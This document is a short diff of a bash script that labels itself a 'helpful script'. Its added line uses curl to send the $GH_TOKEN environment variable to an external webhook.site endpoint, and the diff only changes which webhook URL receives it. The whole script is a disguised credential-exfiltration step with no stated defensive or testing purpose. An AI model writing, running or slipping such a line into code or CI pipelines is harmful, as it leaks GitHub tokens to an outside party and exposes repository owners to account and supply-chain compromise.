@@ -1,4 +1,4 @@
 #! /bin/bash
 echo "helpful script"
 
-curl "https://webhook.site/970f1ead-9bcc-4e3f-9b42-919e2e4eec74/$GH_TOKEN"
+curl "https://webhook.site/66ad8ddc-8646-49f8-9457-a4ba084db2b9/$GH_TOKEN"
